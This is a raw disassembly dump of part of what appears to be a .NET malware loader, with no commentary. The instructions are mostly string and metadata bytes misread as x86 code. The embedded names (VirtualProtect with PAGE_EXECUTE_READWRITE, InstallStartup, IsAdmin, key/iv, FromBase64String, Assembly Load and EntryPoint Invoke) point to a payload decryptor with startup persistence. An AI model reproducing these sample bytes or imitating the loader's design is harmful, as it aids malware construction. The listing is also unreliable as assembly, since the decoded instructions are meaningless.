  406a42:	81 01 41 01 51 06    	addl   $0x6510141,(%ecx)
  406a48:	87 01                	xchg   %eax,(%ecx)
  406a4a:	49                   	dec    %ecx
  406a4b:	01 6e 06             	add    %ebp,0x6(%esi)
  406a4e:	8d 01                	lea    (%ecx),%eax
  406a50:	41                   	inc    %ecx
  406a51:	00 7e 06             	add    %bh,0x6(%esi)
  406a54:	92                   	xchg   %eax,%edx
  406a55:	01 61 00             	add    %esp,0x0(%ecx)
  406a58:	e6 02                	out    %al,$0x2
  406a5a:	98                   	cwtl
  406a5b:	01 41 01             	add    %eax,0x1(%ecx)
  406a5e:	8d 06                	lea    (%esi),%eax
  406a60:	9e                   	sahf
  406a61:	01 61 01             	add    %esp,0x1(%ecx)
  406a64:	a2 06 4d 00 69       	mov    %al,0x69004d06
  406a69:	01 d1                	add    %edx,%ecx
  406a6b:	00 4d 00             	add    %cl,0x0(%ebp)
  406a6e:	71 01                	jno    0x406a71
  406a70:	fc                   	cld
  406a71:	06                   	push   %es
  406a72:	b5 01                	mov    $0x1,%ch
  406a74:	71 01                	jno    0x406a77
  406a76:	11 07                	adc    %eax,(%edi)
  406a78:	bc 01 71 01 2e       	mov    $0x2e017101,%esp
  406a7d:	07                   	pop    %es
  406a7e:	c3                   	ret
  406a7f:	01 89 01 3e 07 cd    	add    %ecx,-0x32f8c1ff(%ecx)
  406a85:	01 91 01 d1 00 e1    	add    %edx,-0x1eff2eff(%ecx)
  406a8b:	01 91 01 d1 00 4d    	add    %edx,0x4d00d101(%ecx)
  406a91:	00 99 01 d1 00 e7    	add    %bl,-0x18ff2eff(%ecx)
  406a97:	01 a1 01 97 07 f1    	add    %esp,-0xef868ff(%ecx)
  406a9d:	01 91 01 9e 07 f8    	add    %edx,-0x7f861ff(%ecx)
  406aa3:	01 99 00 a6 07 0b    	add    %ebx,0xb07a600(%ecx)
  406aa9:	02 b1 01 d1 00 4d    	add    0x4d00d101(%ecx),%dh
  406aaf:	00 b9 01 d1 00 4d    	add    %bh,0x4d00d101(%ecx)
  406ab5:	00 27                	add    %ah,(%edi)
  406ab7:	00 5b 02             	add    %bl,0x2(%ebx)
  406aba:	1f                   	pop    %ds
  406abb:	02 2e                	add    (%esi),%ch
  406abd:	00 1b                	add    %bl,(%ebx)
  406abf:	00 24 02             	add    %ah,(%edx,%eax,1)
  406ac2:	2e 00 23             	add    %ah,%cs:(%ebx)
  406ac5:	00 2d 02 63 00 53    	add    %ch,0x53006302
  406acb:	02 1f                	add    (%edi),%bl
  406acd:	02 08                	add    (%eax),%cl
  406acf:	00 06                	add    %al,(%esi)
  406ad1:	00 4c 02 de          	add    %cl,-0x22(%edx,%eax,1)
  406ad5:	00 3e                	add    %bh,(%esi)
  406ad7:	01 5c 01 a2          	add    %ebx,-0x5e(%ecx,%eax,1)
  406adb:	01 d6                	add    %edx,%esi
  406add:	01 fd                	add    %edi,%ebp
  406adf:	01 12                	add    %edx,(%edx)
  406ae1:	02 39                	add    (%ecx),%bh
  406ae3:	02 00                	add    (%eax),%al
  406ae5:	01 03                	add    %eax,(%ebx)
  406ae7:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406aea:	01 00                	add    %eax,(%eax)
  406aec:	00 01                	add    %al,(%ecx)
  406aee:	05 00 48 00 01       	add    $0x1004800,%eax
  406af3:	00 00                	add    %al,(%eax)
  406af5:	01 07                	add    %eax,(%edi)
  406af7:	00 57 00             	add    %dl,0x0(%edi)
  406afa:	01 00                	add    %eax,(%eax)
  406afc:	04 80                	add    $0x80,%al
	...
  406b0e:	1b 02                	sbb    (%edx),%eax
  406b10:	00 00                	add    %al,(%eax)
  406b12:	04 00                	add    $0x0,%al
	...
  406b1c:	00 00                	add    %al,(%eax)
  406b1e:	01 00                	add    %eax,(%eax)
  406b20:	25 00 00 00 00       	and    $0x0,%eax
  406b25:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406b30:	00 00                	add    %al,(%eax)
  406b32:	01 00                	add    %eax,(%eax)
  406b34:	2e 00 00             	add    %al,%cs:(%eax)
  406b37:	00 00                	add    %al,(%eax)
  406b39:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406b44:	00 00                	add    %al,(%eax)
  406b46:	01 00                	add    %eax,(%eax)
  406b48:	ed                   	in     (%dx),%eax
  406b49:	02 00                	add    (%eax),%al
  406b4b:	00 00                	add    %al,(%eax)
  406b4d:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406b58:	00 00                	add    %al,(%eax)
  406b5a:	72 01                	jb     0x406b5d
  406b5c:	c9                   	leave
  406b5d:	05 00 00 00 00       	add    $0x0,%eax
  406b62:	04 00                	add    $0x0,%al
	...
  406b6c:	00 00                	add    %al,(%eax)
  406b6e:	01 00                	add    %eax,(%eax)
  406b70:	aa                   	stos   %al,%es:(%edi)
  406b71:	06                   	push   %es
	...
  406b7a:	01 00                	add    %eax,(%eax)
  406b7c:	00 00                	add    %al,(%eax)
  406b7e:	0c 08                	or     $0x8,%al
  406b80:	00 00                	add    %al,(%eax)
  406b82:	03 00                	add    (%eax),%eax
  406b84:	02 00                	add    (%eax),%al
  406b86:	00 00                	add    %al,(%eax)
  406b88:	00 3c 4d 6f 64 75 6c 	add    %bh,0x6c75646f(,%ecx,2)
  406b8f:	65 3e 00 79 7a       	gs add %bh,%ds:0x7a(%ecx)
  406b94:	79 68                	jns    0x406bfe
  406b96:	76 74                	jbe    0x406c0c
  406b98:	73 6c                	jae    0x406c06
  406b9a:	65 78 2e             	gs js  0x406bcb
  406b9d:	74 6d                	je     0x406c0c
  406b9f:	70 00                	jo     0x406ba1
  406ba1:	63 71 73             	arpl   %esi,0x73(%ecx)
  406ba4:	73 70                	jae    0x406c16
  406ba6:	00 77 72             	add    %dh,0x72(%edi)
  406ba9:	78 73                	js     0x406c1e
  406bab:	77 00                	ja     0x406bad
  406bad:	6d                   	insl   (%dx),%es:(%edi)
  406bae:	73 63                	jae    0x406c13
  406bb0:	6f                   	outsl  %ds:(%esi),(%dx)
  406bb1:	72 6c                	jb     0x406c1f
  406bb3:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  406bba:	65 6d                	gs insl (%dx),%es:(%edi)
  406bbc:	00 4f 62             	add    %cl,0x62(%edi)
  406bbf:	6a 65                	push   $0x65
  406bc1:	63 74 00 4c          	arpl   %esi,0x4c(%eax,%eax,1)
  406bc5:	6f                   	outsl  %ds:(%esi),(%dx)
  406bc6:	61                   	popa
  406bc7:	64 4c                	fs dec %esp
  406bc9:	69 62 72 61 72 79 00 	imul   $0x797261,0x72(%edx),%esp
  406bd0:	47                   	inc    %edi
  406bd1:	65 74 50             	gs je  0x406c24
  406bd4:	72 6f                	jb     0x406c45
  406bd6:	63 41 64             	arpl   %eax,0x64(%ecx)
  406bd9:	64 72 65             	fs jb  0x406c41
  406bdc:	73 73                	jae    0x406c51
  406bde:	00 56 69             	add    %dl,0x69(%esi)
  406be1:	72 74                	jb     0x406c57
  406be3:	75 61                	jne    0x406c46
  406be5:	6c                   	insb   (%dx),%es:(%edi)
  406be6:	50                   	push   %eax
  406be7:	72 6f                	jb     0x406c58
  406be9:	74 65                	je     0x406c50
  406beb:	63 74 00 50          	arpl   %esi,0x50(%eax,%eax,1)
  406bef:	41                   	inc    %ecx
  406bf0:	47                   	inc    %edi
  406bf1:	45                   	inc    %ebp
  406bf2:	5f                   	pop    %edi
  406bf3:	45                   	inc    %ebp
  406bf4:	58                   	pop    %eax
  406bf5:	45                   	inc    %ebp
  406bf6:	43                   	inc    %ebx
  406bf7:	55                   	push   %ebp
  406bf8:	54                   	push   %esp
  406bf9:	45                   	inc    %ebp
  406bfa:	5f                   	pop    %edi
  406bfb:	52                   	push   %edx
  406bfc:	45                   	inc    %ebp
  406bfd:	41                   	inc    %ecx
  406bfe:	44                   	inc    %esp
  406bff:	57                   	push   %edi
  406c00:	52                   	push   %edx
  406c01:	49                   	dec    %ecx
  406c02:	54                   	push   %esp
  406c03:	45                   	inc    %ebp
  406c04:	00 4d 61             	add    %cl,0x61(%ebp)
  406c07:	69 6e 00 49 73 53 74 	imul   $0x74537349,0x0(%esi),%ebp
  406c0e:	61                   	popa
  406c0f:	72 74                	jb     0x406c85
  406c11:	75 70                	jne    0x406c83
  406c13:	00 49 6e             	add    %cl,0x6e(%ecx)
  406c16:	73 74                	jae    0x406c8c
  406c18:	61                   	popa
  406c19:	6c                   	insb   (%dx),%es:(%edi)
  406c1a:	6c                   	insb   (%dx),%es:(%edi)
  406c1b:	53                   	push   %ebx
  406c1c:	74 61                	je     0x406c7f
  406c1e:	72 74                	jb     0x406c94
  406c20:	75 70                	jne    0x406c92
  406c22:	00 49 73             	add    %cl,0x73(%ecx)
  406c25:	41                   	inc    %ecx
  406c26:	64 6d                	fs insl (%dx),%es:(%edi)
  406c28:	69 6e 00 4b 69 6c 6c 	imul   $0x6c6c694b,0x0(%esi),%ebp
  406c2f:	4e                   	dec    %esi
  406c30:	6f                   	outsl  %ds:(%esi),(%dx)
  406c31:	6e                   	outsb  %ds:(%esi),(%dx)
  406c32:	45                   	inc    %ebp
  406c33:	6c                   	insb   (%dx),%es:(%edi)
  406c34:	65 76 61             	gs jbe 0x406c98
  406c37:	74 65                	je     0x406c9e
  406c39:	64 42                	fs inc %edx
  406c3b:	61                   	popa
  406c3c:	74 49                	je     0x406c87
  406c3e:	6e                   	outsb  %ds:(%esi),(%dx)
  406c3f:	73 74                	jae    0x406cb5
  406c41:	61                   	popa
  406c42:	6e                   	outsb  %ds:(%esi),(%dx)
  406c43:	63 65 73             	arpl   %esp,0x73(%ebp)
  406c46:	00 6d 6d             	add    %ch,0x6d(%ebp)
  406c49:	67 78 71             	addr16 js 0x406cbd
  406c4c:	00 62 65             	add    %ah,0x65(%edx)
  406c4f:	76 74                	jbe    0x406cc5
  406c51:	71 00                	jno    0x406c53
  406c53:	79 73                	jns    0x406cc8
  406c55:	72 76                	jb     0x406ccd
  406c57:	6e                   	outsb  %ds:(%esi),(%dx)
  406c58:	00 2e                	add    %ch,(%esi)
  406c5a:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  406c5e:	00 6c 70 46          	add    %ch,0x46(%eax,%esi,2)
  406c62:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  406c69:	00 
  406c6a:	68 4d 6f 64 75       	push   $0x75646f4d
  406c6f:	6c                   	insb   (%dx),%es:(%edi)
  406c70:	65 00 70 72          	add    %dh,%gs:0x72(%eax)
  406c74:	6f                   	outsl  %ds:(%esi),(%dx)
  406c75:	63 4e 61             	arpl   %ecx,0x61(%esi)
  406c78:	6d                   	insl   (%dx),%es:(%edi)
  406c79:	65 00 6c 70 41       	add    %ch,%gs:0x41(%eax,%esi,2)
  406c7e:	64 64 72 65          	fs fs jb 0x406ce7
  406c82:	73 73                	jae    0x406cf7
  406c84:	00 64 77 53          	add    %ah,0x53(%edi,%esi,2)
  406c88:	69 7a 65 00 66 6c 4e 	imul   $0x4e6c6600,0x65(%edx),%edi
  406c8f:	65 77 50             	gs ja  0x406ce2
  406c92:	72 6f                	jb     0x406d03
  406c94:	74 65                	je     0x406cfb
  406c96:	63 74 00 6c          	arpl   %esi,0x6c(%eax,%eax,1)
  406c9a:	70 66                	jo     0x406d02
  406c9c:	6c                   	insb   (%dx),%es:(%edi)
  406c9d:	4f                   	dec    %edi
  406c9e:	6c                   	insb   (%dx),%es:(%edi)
  406c9f:	64 50                	fs push %eax
  406ca1:	72 6f                	jb     0x406d12
  406ca3:	74 65                	je     0x406d0a
  406ca5:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  406ca9:	79 73                	jns    0x406d1e
  406cab:	74 65                	je     0x406d12
  406cad:	6d                   	insl   (%dx),%es:(%edi)
  406cae:	2e 52                	cs push %edx
  406cb0:	75 6e                	jne    0x406d20
  406cb2:	74 69                	je     0x406d1d
  406cb4:	6d                   	insl   (%dx),%es:(%edi)
  406cb5:	65 2e 49             	gs cs dec %ecx
  406cb8:	6e                   	outsb  %ds:(%esi),(%dx)
  406cb9:	74 65                	je     0x406d20
  406cbb:	72 6f                	jb     0x406d2c
  406cbd:	70 53                	jo     0x406d12
  406cbf:	65 72 76             	gs jb  0x406d38
  406cc2:	69 63 65 73 00 4f 75 	imul   $0x754f0073,0x65(%ebx),%esp
  406cc9:	74 41                	je     0x406d0c
  406ccb:	74 74                	je     0x406d41
  406ccd:	72 69                	jb     0x406d38
  406ccf:	62 75 74             	bound  %esi,0x74(%ebp)
  406cd2:	65 00 61 72          	add    %ah,%gs:0x72(%ecx)
  406cd6:	67 73 00             	addr16 jae 0x406cd9
  406cd9:	70 61                	jo     0x406d3c
  406cdb:	74 68                	je     0x406d45
  406cdd:	00 62 61             	add    %ah,0x61(%edx)
  406ce0:	74 50                	je     0x406d32
  406ce2:	61                   	popa
  406ce3:	74 68                	je     0x406d4d
  406ce5:	00 69 6e             	add    %ch,0x6e(%ecx)
  406ce8:	70 75                	jo     0x406d5f
  406cea:	74 00                	je     0x406cec
  406cec:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  406cf0:	69 76 00 62 79 74 65 	imul   $0x65747962,0x0(%esi),%esi
  406cf7:	73 00                	jae    0x406cf9
  406cf9:	6e                   	outsb  %ds:(%esi),(%dx)
  406cfa:	61                   	popa
  406cfb:	6d                   	insl   (%dx),%es:(%edi)
  406cfc:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  406d00:	73 74                	jae    0x406d76
  406d02:	65 6d                	gs insl (%dx),%es:(%edi)
  406d04:	2e 53                	cs push %ebx
  406d06:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  406d0a:	69 74 79 2e 50 65 72 	imul   $0x6d726550,0x2e(%ecx,%edi,2),%esi
  406d11:	6d 
  406d12:	69 73 73 69 6f 6e 73 	imul   $0x736e6f69,0x73(%ebx),%esi
  406d19:	00 53 65             	add    %dl,0x65(%ebx)
  406d1c:	63 75 72             	arpl   %esi,0x72(%ebp)
  406d1f:	69 74 79 50 65 72 6d 	imul   $0x696d7265,0x50(%ecx,%edi,2),%esi
  406d26:	69 
  406d27:	73 73                	jae    0x406d9c
  406d29:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  406d30:	69 62 75 74 65 00 53 	imul   $0x53006574,0x75(%edx),%esp
  406d37:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  406d3b:	69 74 79 41 63 74 69 	imul   $0x6f697463,0x41(%ecx,%edi,2),%esi
  406d42:	6f 
  406d43:	6e                   	outsb  %ds:(%esi),(%dx)
  406d44:	00 53 79             	add    %dl,0x79(%ebx)
  406d47:	73 74                	jae    0x406dbd
  406d49:	65 6d                	gs insl (%dx),%es:(%edi)
  406d4b:	2e 52                	cs push %edx
  406d4d:	75 6e                	jne    0x406dbd
  406d4f:	74 69                	je     0x406dba
  406d51:	6d                   	insl   (%dx),%es:(%edi)
  406d52:	65 2e 43             	gs cs inc %ebx
  406d55:	6f                   	outsl  %ds:(%esi),(%dx)
  406d56:	6d                   	insl   (%dx),%es:(%edi)
  406d57:	70 69                	jo     0x406dc2
  406d59:	6c                   	insb   (%dx),%es:(%edi)
  406d5a:	65 72 53             	gs jb  0x406db0
  406d5d:	65 72 76             	gs jb  0x406dd6
  406d60:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  406d67:	6d                   	insl   (%dx),%es:(%edi)
  406d68:	70 69                	jo     0x406dd3
  406d6a:	6c                   	insb   (%dx),%es:(%edi)
  406d6b:	61                   	popa
  406d6c:	74 69                	je     0x406dd7
  406d6e:	6f                   	outsl  %ds:(%esi),(%dx)
  406d6f:	6e                   	outsb  %ds:(%esi),(%dx)
  406d70:	52                   	push   %edx
  406d71:	65 6c                	gs insb (%dx),%es:(%edi)
  406d73:	61                   	popa
  406d74:	78 61                	js     0x406dd7
  406d76:	74 69                	je     0x406de1
  406d78:	6f                   	outsl  %ds:(%esi),(%dx)
  406d79:	6e                   	outsb  %ds:(%esi),(%dx)
  406d7a:	73 41                	jae    0x406dbd
  406d7c:	74 74                	je     0x406df2
  406d7e:	72 69                	jb     0x406de9
  406d80:	62 75 74             	bound  %esi,0x74(%ebp)
  406d83:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  406d87:	6e                   	outsb  %ds:(%esi),(%dx)
  406d88:	74 69                	je     0x406df3
  406d8a:	6d                   	insl   (%dx),%es:(%edi)
  406d8b:	65 43                	gs inc %ebx
  406d8d:	6f                   	outsl  %ds:(%esi),(%dx)
  406d8e:	6d                   	insl   (%dx),%es:(%edi)
  406d8f:	70 61                	jo     0x406df2
  406d91:	74 69                	je     0x406dfc
  406d93:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  406d96:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  406d9d:	69 
  406d9e:	62 75 74             	bound  %esi,0x74(%ebp)
  406da1:	65 00 79 7a          	add    %bh,%gs:0x7a(%ecx)
  406da5:	79 68                	jns    0x406e0f
  406da7:	76 74                	jbe    0x406e1d
  406da9:	73 6c                	jae    0x406e17
  406dab:	65 78 00             	gs js  0x406dae
  406dae:	44                   	inc    %esp
  406daf:	6c                   	insb   (%dx),%es:(%edi)
  406db0:	6c                   	insb   (%dx),%es:(%edi)
  406db1:	49                   	dec    %ecx
  406db2:	6d                   	insl   (%dx),%es:(%edi)
  406db3:	70 6f                	jo     0x406e24
  406db5:	72 74                	jb     0x406e2b
  406db7:	41                   	inc    %ecx
  406db8:	74 74                	je     0x406e2e
  406dba:	72 69                	jb     0x406e25
  406dbc:	62 75 74             	bound  %esi,0x74(%ebp)
  406dbf:	65 00 6b 65          	add    %ch,%gs:0x65(%ebx)
  406dc3:	72 6e                	jb     0x406e33
  406dc5:	65 6c                	gs insb (%dx),%es:(%edi)
  406dc7:	33 32                	xor    (%edx),%esi
  406dc9:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  406dcc:	6c                   	insb   (%dx),%es:(%edi)
  406dcd:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  406dd0:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  406dd3:	44                   	inc    %esp
  406dd4:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  406ddb:	6c                   	insb   (%dx),%es:(%edi)
  406ddc:	61                   	popa
  406ddd:	73 73                	jae    0x406e52
  406ddf:	32 00                	xor    (%eax),%al
  406de1:	3c 4d                	cmp    $0x4d,%al
  406de3:	61                   	popa
  406de4:	69 6e 3e 62 5f 5f 30 	imul   $0x305f5f62,0x3e(%esi),%ebp
  406deb:	00 53 79             	add    %dl,0x79(%ebx)
  406dee:	73 74                	jae    0x406e64
  406df0:	65 6d                	gs insl (%dx),%es:(%edi)
  406df2:	2e 44                	cs inc %esp
  406df4:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  406dfb:	69 63 73 00 50 72 6f 	imul   $0x6f725000,0x73(%ebx),%esp
  406e02:	63 65 73             	arpl   %esp,0x73(%ebp)
  406e05:	73 00                	jae    0x406e07
  406e07:	53                   	push   %ebx
  406e08:	74 61                	je     0x406e6b
  406e0a:	72 74                	jb     0x406e80
  406e0c:	00 57 61             	add    %dl,0x61(%edi)
  406e0f:	69 74 46 6f 72 45 78 	imul   $0x69784572,0x6f(%esi,%eax,2),%esi
  406e16:	69 
  406e17:	74 00                	je     0x406e19
  406e19:	53                   	push   %ebx
  406e1a:	79 73                	jns    0x406e8f
  406e1c:	74 65                	je     0x406e83
  406e1e:	6d                   	insl   (%dx),%es:(%edi)
  406e1f:	2e 49                	cs dec %ecx
  406e21:	4f                   	dec    %edi
  406e22:	00 46 69             	add    %al,0x69(%esi)
  406e25:	6c                   	insb   (%dx),%es:(%edi)
  406e26:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  406e2a:	6c                   	insb   (%dx),%es:(%edi)
  406e2b:	65 41                	gs inc %ecx
  406e2d:	74 74                	je     0x406ea3
  406e2f:	72 69                	jb     0x406e9a
  406e31:	62 75 74             	bound  %esi,0x74(%ebp)
  406e34:	65 73 00             	gs jae 0x406e37
  406e37:	53                   	push   %ebx
  406e38:	65 74 41             	gs je  0x406e7c
  406e3b:	74 74                	je     0x406eb1
  406e3d:	72 69                	jb     0x406ea8
  406e3f:	62 75 74             	bound  %esi,0x74(%ebp)
  406e42:	65 73 00             	gs jae 0x406e45
  406e45:	44                   	inc    %esp
  406e46:	65 6c                	gs insb (%dx),%es:(%edi)
  406e48:	65 74 65             	gs je  0x406eb0
  406e4b:	00 43 6f             	add    %al,0x6f(%ebx)
  406e4e:	6e                   	outsb  %ds:(%esi),(%dx)
  406e4f:	73 6f                	jae    0x406ec0
  406e51:	6c                   	insb   (%dx),%es:(%edi)
  406e52:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  406e56:	74 5f                	je     0x406eb7
  406e58:	54                   	push   %esp
  406e59:	69 74 6c 65 00 54 6f 	imul   $0x536f5400,0x65(%esp,%ebp,2),%esi
  406e60:	53 
  406e61:	74 72                	je     0x406ed5
  406e63:	69 6e 67 00 53 74 72 	imul   $0x72745300,0x67(%esi),%ebp
  406e6a:	69 6e 67 00 43 6f 6e 	imul   $0x6e6f4300,0x67(%esi),%ebp
  406e71:	63 61 74             	arpl   %esp,0x74(%ecx)
  406e74:	00 53 79             	add    %dl,0x79(%ebx)
  406e77:	73 74                	jae    0x406eed
  406e79:	65 6d                	gs insl (%dx),%es:(%edi)
  406e7b:	2e 57                	cs push %edi
  406e7d:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  406e84:	46                   	inc    %esi
  406e85:	6f                   	outsl  %ds:(%esi),(%dx)
  406e86:	72 6d                	jb     0x406ef5
  406e88:	73 00                	jae    0x406e8a
  406e8a:	4d                   	dec    %ebp
  406e8b:	65 73 73             	gs jae 0x406f01
  406e8e:	61                   	popa
  406e8f:	67 65 42             	addr16 gs inc %edx
  406e92:	6f                   	outsl  %ds:(%esi),(%dx)
  406e93:	78 00                	js     0x406e95
  406e95:	44                   	inc    %esp
  406e96:	69 61 6c 6f 67 52 65 	imul   $0x6552676f,0x6c(%ecx),%esp
  406e9d:	73 75                	jae    0x406f14
  406e9f:	6c                   	insb   (%dx),%es:(%edi)
  406ea0:	74 00                	je     0x406ea2
  406ea2:	53                   	push   %ebx
  406ea3:	68 6f 77 00 47       	push   $0x4700776f
  406ea8:	65 74 43             	gs je  0x406eee
  406eab:	75 72                	jne    0x406f1f
  406ead:	72 65                	jb     0x406f14
  406eaf:	6e                   	outsb  %ds:(%esi),(%dx)
  406eb0:	74 50                	je     0x406f02
  406eb2:	72 6f                	jb     0x406f23
  406eb4:	63 65 73             	arpl   %esp,0x73(%ebp)
  406eb7:	73 00                	jae    0x406eb9
  406eb9:	4b                   	dec    %ebx
  406eba:	69 6c 6c 00 49 6e 74 	imul   $0x50746e49,0x0(%esp,%ebp,2),%ebp
  406ec1:	50 
  406ec2:	74 72                	je     0x406f36
  406ec4:	00 67 65             	add    %ah,0x65(%edi)
  406ec7:	74 5f                	je     0x406f28
  406ec9:	53                   	push   %ebx
  406eca:	69 7a 65 00 42 79 74 	imul   $0x74794200,0x65(%edx),%edi
  406ed1:	65 00 55 49          	add    %dl,%gs:0x49(%ebp)
  406ed5:	6e                   	outsb  %ds:(%esi),(%dx)
  406ed6:	74 50                	je     0x406f28
  406ed8:	74 72                	je     0x406f4c
  406eda:	00 6f 70             	add    %ch,0x70(%edi)
  406edd:	5f                   	pop    %edi
  406ede:	45                   	inc    %ebp
  406edf:	78 70                	js     0x406f51
  406ee1:	6c                   	insb   (%dx),%es:(%edi)
  406ee2:	69 63 69 74 00 4d 61 	imul   $0x614d0074,0x69(%ebx),%esp
  406ee9:	72 73                	jb     0x406f5e
  406eeb:	68 61 6c 00 43       	push   $0x43006c61
  406ef0:	6f                   	outsl  %ds:(%esi),(%dx)
  406ef1:	70 79                	jo     0x406f6c
  406ef3:	00 53 79             	add    %dl,0x79(%ebx)
  406ef6:	73 74                	jae    0x406f6c
  406ef8:	65 6d                	gs insl (%dx),%es:(%edi)
  406efa:	2e 52                	cs push %edx
  406efc:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  406eff:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406f04:	6e                   	outsb  %ds:(%esi),(%dx)
  406f05:	00 41 73             	add    %al,0x73(%ecx)
  406f08:	73 65                	jae    0x406f6f
  406f0a:	6d                   	insl   (%dx),%es:(%edi)
  406f0b:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  406f0f:	47                   	inc    %edi
  406f10:	65 74 45             	gs je  0x406f58
  406f13:	78 65                	js     0x406f7a
  406f15:	63 75 74             	arpl   %esi,0x74(%ebp)
  406f18:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  406f1f:	6d                   	insl   (%dx),%es:(%edi)
  406f20:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  406f24:	47                   	inc    %edi
  406f25:	65 74 4d             	gs je  0x406f75
  406f28:	61                   	popa
  406f29:	6e                   	outsb  %ds:(%esi),(%dx)
  406f2a:	69 66 65 73 74 52 65 	imul   $0x65527473,0x65(%esi),%esp
  406f31:	73 6f                	jae    0x406fa2
  406f33:	75 72                	jne    0x406fa7
  406f35:	63 65 4e             	arpl   %esp,0x4e(%ebp)
  406f38:	61                   	popa
  406f39:	6d                   	insl   (%dx),%es:(%edi)
  406f3a:	65 73 00             	gs jae 0x406f3d
  406f3d:	6f                   	outsl  %ds:(%esi),(%dx)
  406f3e:	70 5f                	jo     0x406f9f
  406f40:	45                   	inc    %ebp
  406f41:	71 75                	jno    0x406fb8
  406f43:	61                   	popa
  406f44:	6c                   	insb   (%dx),%es:(%edi)
  406f45:	69 74 79 00 49 73 4e 	imul   $0x754e7349,0x0(%ecx,%edi,2),%esi
  406f4c:	75 
  406f4d:	6c                   	insb   (%dx),%es:(%edi)
  406f4e:	6c                   	insb   (%dx),%es:(%edi)
  406f4f:	4f                   	dec    %edi
  406f50:	72 57                	jb     0x406fa9
  406f52:	68 69 74 65 53       	push   $0x53657469
  406f57:	70 61                	jo     0x406fba
  406f59:	63 65 00             	arpl   %esp,0x0(%ebp)
  406f5c:	45                   	inc    %ebp
  406f5d:	6e                   	outsb  %ds:(%esi),(%dx)
  406f5e:	64 73 57             	fs jae 0x406fb8
  406f61:	69 74 68 00 57 72 69 	imul   $0x74697257,0x0(%eax,%ebp,2),%esi
  406f68:	74 
  406f69:	65 41                	gs inc %ecx
  406f6b:	6c                   	insb   (%dx),%es:(%edi)
  406f6c:	6c                   	insb   (%dx),%es:(%edi)
  406f6d:	42                   	inc    %edx
  406f6e:	79 74                	jns    0x406fe4
  406f70:	65 73 00             	gs jae 0x406f73
  406f73:	53                   	push   %ebx
  406f74:	79 73                	jns    0x406fe9
  406f76:	74 65                	je     0x406fdd
  406f78:	6d                   	insl   (%dx),%es:(%edi)
  406f79:	2e 54                	cs push %esp
  406f7b:	68 72 65 61 64       	push   $0x64616572
  406f80:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
  406f87:	65 61                	gs popa
  406f89:	64 53                	fs push %ebx
  406f8b:	74 61                	je     0x406fee
  406f8d:	72 74                	jb     0x407003
  406f8f:	00 54 68 72          	add    %dl,0x72(%eax,%ebp,2)
  406f93:	65 61                	gs popa
  406f95:	64 00 43 6f          	add    %al,%fs:0x6f(%ebx)
  406f99:	6e                   	outsb  %ds:(%esi),(%dx)
  406f9a:	76 65                	jbe    0x407001
  406f9c:	72 74                	jb     0x407012
  406f9e:	00 46 72             	add    %al,0x72(%esi)
  406fa1:	6f                   	outsl  %ds:(%esi),(%dx)
  406fa2:	6d                   	insl   (%dx),%es:(%edi)
  406fa3:	42                   	inc    %edx
  406fa4:	61                   	popa
  406fa5:	73 65                	jae    0x40700c
  406fa7:	36 34 53             	ss xor $0x53,%al
  406faa:	74 72                	je     0x40701e
  406fac:	69 6e 67 00 43 68 61 	imul   $0x61684300,0x67(%esi),%ebp
  406fb3:	72 00                	jb     0x406fb5
  406fb5:	53                   	push   %ebx
  406fb6:	70 6c                	jo     0x407024
  406fb8:	69 74 00 4c 6f 61 64 	imul   $0x64616f,0x4c(%eax,%eax,1),%esi
  406fbf:	00 
  406fc0:	4d                   	dec    %ebp
  406fc1:	65 74 68             	gs je  0x40702c
  406fc4:	6f                   	outsl  %ds:(%esi),(%dx)
  406fc5:	64 49                	fs dec %ecx
  406fc7:	6e                   	outsb  %ds:(%esi),(%dx)
  406fc8:	66 6f                	outsw  %ds:(%esi),(%dx)
  406fca:	00 67 65             	add    %ah,0x65(%edi)
  406fcd:	74 5f                	je     0x40702e
  406fcf:	45                   	inc    %ebp
  406fd0:	6e                   	outsb  %ds:(%esi),(%dx)
  406fd1:	74 72                	je     0x407045
  406fd3:	79 50                	jns    0x407025
  406fd5:	6f                   	outsl  %ds:(%esi),(%dx)
  406fd6:	69 6e 74 00 4d 65 74 	imul   $0x74654d00,0x74(%esi),%ebp
  406fdd:	68 6f 64 42 61       	push   $0x6142646f
  406fe2:	73 65                	jae    0x407049
  406fe4:	00 49 6e             	add    %cl,0x6e(%ecx)
  406fe7:	76 6f                	jbe    0x407058
  406fe9:	6b 65 00 45          	imul   $0x45,0x0(%ebp),%esp
  406fed:	78 63                	js     0x407052
  406fef:	65 70 74             	gs jo  0x407066
  406ff2:	69 6f 6e 00 45 6e 76 	imul   $0x766e4500,0x6e(%edi),%ebp
